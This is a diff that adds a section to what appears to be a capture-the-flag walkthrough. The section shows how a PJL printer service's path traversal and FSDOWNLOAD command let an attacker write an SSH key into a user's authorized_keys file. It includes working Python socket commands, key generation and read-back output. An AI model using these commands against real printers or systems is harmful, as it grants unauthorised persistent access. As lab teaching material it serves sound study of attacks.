@@ -679,6 +679,73 @@ s.close()
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 4.3 Write an SSH key via PJL `FSDOWNLOAD`
+
+**Why this step:** The PJL traversal that read `user.txt` also permits writes via `FSDOWNLOAD`. Writing an attacker-controlled public key into `archivist`'s `authorized_keys` converts arbitrary file write into an interactive SSH login.
+
+**Precondition check (on target):** Confirm `/home/archivist/.ssh/` exists, since `FSDOWNLOAD` will not create missing directories.
+
+```bash
+python3 -c '
+import socket
+s=socket.socket(); s.connect(("127.0.0.1",9100))
+s.send(b"@PJL FSDIRLIST NAME=\"../../../../home/archivist\" ENTRY=1 COUNT=100\n")
+print(s.recv(4096).decode(errors="ignore")); s.close()
+'
+```
+
+Result included `.ssh TYPE=DIR SIZE=4096`, so the directory is present.
+
+**Key generation (attacker):**
+
+```bash
+ssh-keygen -t ed25519 -f archivist_key -N ""
+```
+
+**Write command (on target):**
+
+bash
+
+```bash
+python3 -c '
+import socket
+key = b"ssh-ed25519 AAAA...R9R nedmoeca@kali\n"
+s=socket.socket(); s.connect(("127.0.0.1",9100))
+hdr=b"@PJL FSDOWNLOAD FORMAT:BINARY NAME=\"../../../../home/archivist/.ssh/authorized_keys\" SIZE=%d\n" % len(key)
+s.send(hdr); s.send(key); s.close()
+print("[+] key written")
+'
+```
+
+**Breakdown:**
+
+- `ssh-keygen -t ed25519 -f archivist_key -N ""`: generate a passwordless keypair dedicated to this login.
+- `@PJL FSDOWNLOAD FORMAT:BINARY NAME="..." SIZE=<n>`: PJL command that writes `<n>` bytes of following data to the named path.
+- `../../../../home/archivist/.ssh/authorized_keys`: traversal to `archivist`'s key store.
+- `s.send(hdr); s.send(key)`: send the header, then exactly `SIZE` bytes of key material.
+
+**Result (verification via `FSUPLOAD`):**
+
+```
+@PJL FSUPLOAD NAME="../../../../home/archivist/.ssh/authorized_keys" SIZE=95
+ssh-ed25519 AAAA...R9R nedmoeca@kali
+```
+
+**What this gives you:**
+
+- Key finding: the PJL `FSDOWNLOAD` command gives arbitrary file write, used here to authorize an attacker SSH key for `archivist`.
+- Read-back confirms the 95-byte key is in place, so SSH login as `archivist` is now possible.
+
+**Next:** SSH in as `archivist` and enumerate the root-owned management socket for privilege escalation.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
